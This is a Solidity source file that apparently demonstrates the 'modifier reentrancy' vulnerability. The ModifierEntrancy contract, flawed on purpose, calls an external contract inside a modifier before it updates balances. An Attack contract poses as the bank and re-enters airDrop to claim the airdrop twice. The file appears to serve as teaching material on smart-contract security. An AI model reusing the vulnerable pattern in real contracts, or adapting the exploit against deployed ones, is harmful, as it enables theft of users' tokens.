pragma solidity ^0.4.24;

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string constant name = "Nu Token";
  Bank bank;

  constructor(address _bank) public {
    bank = Bank(_bank);
  }

  //If a contract has a zero balance and supports the token give them some token
  function airDrop() hasNoBalance supportsToken public {
    tokenBalance[msg.sender] += 20;
  }

  //Checks that the contract responds the way we want
  modifier supportsToken() {
    require(keccak256(abi.encodePacked(name)) == bank.supportsToken());
    _;
  }

  //Checks that the caller has a zero balance
  modifier hasNoBalance() {
    require(tokenBalance[msg.sender] == 0);
    _;
  }
}

contract Bank {
  function supportsToken() external pure returns(bytes32) {
    return(keccak256(abi.encodePacked("Nu Token")));
  }
}

contract Attack {
  bool hasBeenCalled;
  ModifierEntrancy target;

  constructor(address _target) public {
    target = ModifierEntrancy(_target);
  }

  function supportsToken() external returns(bytes32) {
    if(!hasBeenCalled) {
      hasBeenCalled = true;
      target.airDrop();
    }
    return(keccak256(abi.encodePacked("Nu Token")));
  }

  function callTarget() public {
    target.airDrop();
  }
}